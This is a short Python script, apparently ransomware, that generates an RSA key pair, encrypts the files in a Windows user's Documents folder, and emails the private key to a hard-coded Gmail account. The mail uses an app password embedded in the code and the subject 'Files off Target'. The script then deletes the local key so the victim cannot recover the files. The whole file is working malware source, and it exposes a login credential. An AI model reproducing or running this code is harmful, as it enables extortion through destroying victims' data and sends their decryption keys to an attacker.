#created by Sebastian Hyjek
#09/16/2024
import os
import sys
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

def gen_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    public_key = private_key.public_key()

    # Save the private key
    with open("private_key.pem", "wb") as f:
        f.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    # Save the public key
    with open("public_key.pem", "wb") as f:
        f.write(
            public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

    send_delete_private_key()

    return public_key

def encrypt_files(files_to_encrypt, public_key):
    for file in files_to_encrypt:
        with open(file, 'rb') as f:
            data = f.read()
        enc_data = public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open(file, 'wb') as f:
            f.write(enc_data)

def decrypt_files(files_to_decrypt, private_key):
    for file in files_to_decrypt:
        with open(file, 'rb') as f:
            data = f.read()
        decrypted_data = private_key.decrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open(file, 'wb') as f:
            f.write(decrypted_data)

def send_delete_private_key():
    # Setup sender and receiver info
    sender = 'sebby.hyjek@gmail.com'
    receiver = sender
    #Custom password given by gmail
    sender_pass = 'nxsg zpqq hygo lpif'

    message = MIMEMultipart()
    message['From'] = sender
    message['To'] = receiver
    message['Subject'] = 'Files off Target'

    mail_body = "Here are the encrypted files off the target :)"
    message.attach(MIMEText(mail_body, 'plain'))


    with open("private_key.pem", 'rb') as file:
        payload = MIMEBase('application', 'octet-stream')
        payload.set_payload(file.read())
    encoders.encode_base64(payload)
    payload.add_header('Content-Disposition', 'attachment', filename="private_key.pem")
    message.attach(payload)

    # Set up the SMTP session
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender, sender_pass)
    session.sendmail(sender, receiver, message.as_string())
    session.quit()

    os.remove(os.getcwd() + "\\private_key.pem")

if __name__ == '__main__':
    os.chdir(os.path.expandvars(r"C:\%username%\Documents"))
    files = [entry.name for entry in os.scandir(os.getcwd()) if entry.is_file() and entry != "ransomware.py"]

    if not os.path.exists(os.getcwd() + "\\public_key.pem"):
        pub_key = gen_keys()
        encrypt_files(files, pub_key)

    if len(sys.argv) > 2:
        print("TOO MANY ARGUMENTS\nUse h or help for usage instructions")
    elif sys.argv[1] == 'h' or sys.argv[1] == "help":
        print(f"Usage: {sys.argv[0]} [private_key.pem]")
    elif sys.argv[1] == "private_key.pem":
        with open(sys.argv[1], "rb") as key_file:
            priv_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )
        decrypt_files(files, priv_key)
    else:
        print("Incorrect usage, type h or help to see usage instructions")
